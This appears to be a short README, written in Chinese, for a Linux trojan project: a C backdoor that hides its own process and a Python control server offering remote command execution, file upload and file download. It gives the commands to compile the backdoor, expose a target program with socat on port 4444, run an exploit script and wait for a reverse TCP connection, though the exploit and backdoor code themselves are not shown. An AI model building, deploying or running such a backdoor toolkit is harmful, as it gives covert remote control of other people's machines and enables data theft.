# LinuxCMemoryTorjan

这是一个用C实现的Linux下可实现进程隐藏的后门程序和用python实现的服务器端程序

服务器端程序具备简单的交互功能，可实现远程命令执行、文件上传、文件下载三个功能

## How to use
### Compile
```
make
```

### start service
```
socat tcp4-listen:4444,fork exec:./company
```

### attack
```
python exp.py
```

### wait reverse-tcp connection
```
python cmd_server.py
```
